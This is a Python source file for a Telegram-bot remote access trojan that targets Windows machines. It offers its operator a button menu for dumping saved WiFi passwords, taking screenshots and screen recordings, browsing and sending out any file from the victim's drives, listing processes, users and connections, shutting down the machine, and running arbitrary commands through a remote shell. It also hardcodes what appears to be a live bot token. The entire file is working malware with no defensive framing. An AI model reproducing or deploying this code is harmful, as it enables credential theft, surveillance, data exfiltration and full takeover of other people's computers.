import telebot
import subprocess
import os
import platform
import socket
import threading
import cv2
import numpy as np
import pyautogui
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from PIL import ImageGrab
# Replace with your bot token
BOT_TOKEN = "7460159243:AAGA-z1WGSggVKCK1-EoVPSu-JoKNLiE_Yg"
USER_ID = 7648971114

bot = telebot.TeleBot(BOT_TOKEN)

recording = False
video_filename = "screen_record.avi"
user_paths = {}
def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

def get_wifi_passwords():
    output = run_command("netsh wlan show profiles")
    profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]

    wifi_details = "🔐 Saved WiFi Passwords:\n"
    for profile in profiles:
        password_cmd = f'netsh wlan show profile "{profile}" key=clear'
        password_output = run_command(password_cmd)
        password_lines = [line.split(":")[1].strip() for line in password_output.split("\n") if "Key Content" in line]
        password = password_lines[0] if password_lines else "No Password Found"
        wifi_details += f"📶 {profile}: {password}\n"

    return wifi_details if profiles else "❌ No saved WiFi networks found."


def capture_screenshot():
    screenshot_path = "screenshot.png"
    img = ImageGrab.grab()
    img.save(screenshot_path)
    return screenshot_path


def record_screen():
    global recording
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_filename, fourcc, 10, screen_size)

    while recording:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()


def send_long_message(chat_id, text):
    MAX_LENGTH = 4000
    for i in range(0, len(text), MAX_LENGTH):
        bot.send_message(chat_id, f"```\n{text[i:i+MAX_LENGTH]}\n```", parse_mode="Markdown")

def show_menu(chat_id):
    markup = InlineKeyboardMarkup()

    buttons = [
        ("📌 IP Config", "ipconfig"),
        ("📡 WiFi Profiles", "wifi_profiles"),
        ("🔐 WiFi Passwords", "wifi_passwords"),
        ("📋 Task List", "tasklist"),
        ("🌐 Netstat", "netstat"),
        ("👥 Users", "users"),
        ("🛠 Installed Apps", "installed_apps"),
        ("📸 Screenshot", "screenshot"),
        ("📂 Download File", "download"),
        ("🎥 Screen Record", "screen_record_menu"),
        ("🔴 Shutdown", "shutdown"),
        ("♻ Restart", "restart"),
        ("🔹 CMD Access", "cmd_access")  # New CMD Access option
    ]

    for text, callback in buttons:
        markup.add(InlineKeyboardButton(text, callback_data=callback))

    bot.send_message(chat_id, "🔹 *Select an Option:*", reply_markup=markup, parse_mode="Markdown")


def list_files(chat_id, path=None):
    if not path:
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        user_paths[chat_id] = None
        items = drives
    else:
        user_paths[chat_id] = path
        items = os.listdir(path)

    markup = InlineKeyboardMarkup()
    if path:
        markup.add(InlineKeyboardButton("🔙 Back", callback_data="back"))

    for item in items:
        full_path = os.path.join(path, item) if path else item
        if os.path.isdir(full_path):
            markup.add(InlineKeyboardButton(f"📂 {item}", callback_data=f"folder:{full_path}"))
        else:
            markup.add(InlineKeyboardButton(f"📄 {item}", callback_data=f"file:{full_path}"))

    bot.send_message(chat_id, "📂 *Select a File or Folder:*", reply_markup=markup, parse_mode="Markdown")

def execute_cmd(message):
    chat_id = message.chat.id
    command = message.text

    if command.lower() in ["exit", "quit"]:
        bot.send_message(chat_id, "❌ *CMD Access Closed.*", parse_mode="Markdown")
        return

    output = run_command(command)
    send_long_message(chat_id, output)  # Send output in chunks if too long
    bot.send_message(chat_id, "✅ *Enter another command or type 'exit' to close CMD access.*", parse_mode="Markdown")
    bot.register_next_step_handler_by_chat_id(chat_id, execute_cmd)  # Keep session active


@bot.message_handler(func=lambda message: message.chat.id == USER_ID)
def command_handler(message):
    if message.text == "/start" or message.text == "/help":
        show_menu(message.chat.id)


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global recording
    chat_id = call.message.chat.id
    command = call.data

    if command == "ipconfig":
        output = run_command("ipconfig")
    elif command == "wifi_profiles":
        output = run_command("netsh wlan show profiles")
    elif command == "wifi_passwords":
        output = get_wifi_passwords()
    elif command == "tasklist":
        output = run_command("tasklist")
    elif command == "netstat":
        output = run_command("netstat -an")
    elif command == "users":
        output = run_command("query user")
    elif command == "installed_apps":
        output = run_command('wmic product get name')
    elif command == "screenshot":
        screenshot_path = capture_screenshot()
        bot.send_photo(chat_id, open(screenshot_path, "rb"))
        os.remove(screenshot_path)
        return
    elif command == "shutdown":
        output = run_command("shutdown /s /t 10")
    elif command == "restart":
        output = run_command("shutdown /r /t 10")
    elif command == "download":
        list_files(chat_id)  # Show drives
        return

    elif command.startswith("folder:"):
        folder_path = command.split("folder:")[1]
        list_files(chat_id, folder_path)
        return
    elif command.startswith("file:"):
        file_path = command.split("file:")[1]
        try:
            bot.send_document(chat_id, open(file_path, "rb"))
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error: {str(e)}")
        return

    elif command == "back":
        prev_path = os.path.dirname(user_paths.get(chat_id, ""))
        list_files(chat_id, prev_path if prev_path else None)
        return
    elif command == "screen_record_menu":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("▶ Start Recording", callback_data="start_recording"))
        markup.add(InlineKeyboardButton("⏹ Stop Recording", callback_data="stop_recording"))
        bot.send_message(chat_id, "🎥 *Screen Recording Options:*", reply_markup=markup, parse_mode="Markdown")
        return
    elif command == "start_recording":
        if not recording:
            recording = True
            bot.send_message(chat_id, "🎥 *Screen recording started...*")
            threading.Thread(target=record_screen).start()
        else:
            bot.send_message(chat_id, "⚠ *Screen recording is already running.*")
        return
    elif command == "stop_recording":
        if recording:
            recording = False
            bot.send_message(chat_id, "⏹ *Screen recording stopped.* Sending file...")
            bot.send_video(chat_id, open(video_filename, "rb"))
            os.remove(video_filename)
        else:
            bot.send_message(chat_id, "⚠ *No active recording to stop.*")
        return
    elif command == "cmd_access":
        bot.send_message(chat_id, "🖥 *CMD Access Enabled*\n\nEnter your command:", parse_mode="Markdown")
        bot.register_next_step_handler_by_chat_id(chat_id, execute_cmd)
        return
    else:
        output = "❌ Unknown command."

    send_long_message(chat_id, output)
    show_menu(chat_id)

bot.polling()
